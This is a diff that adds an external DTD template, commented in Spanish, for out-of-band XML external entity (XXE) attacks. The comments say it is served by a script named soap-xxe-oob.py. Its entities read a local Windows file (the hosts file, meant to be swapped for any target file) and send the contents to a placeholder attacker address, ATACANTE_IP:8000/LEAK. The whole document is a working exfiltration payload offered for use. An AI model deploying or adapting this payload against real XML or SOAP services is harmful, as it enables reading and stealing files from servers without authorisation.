@@ -1,0 +1,7 @@
+<!-- Plantilla de DTD externa para XXE out-of-band.
+     Reemplaza el archivo objetivo y ATACANTE_IP:PUERTO.
+     El script soap-xxe-oob.py genera y sirve esta DTD automaticamente. -->
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATACANTE_IP:8000/LEAK?d=%file;'>">
+%eval;
+%exfil;
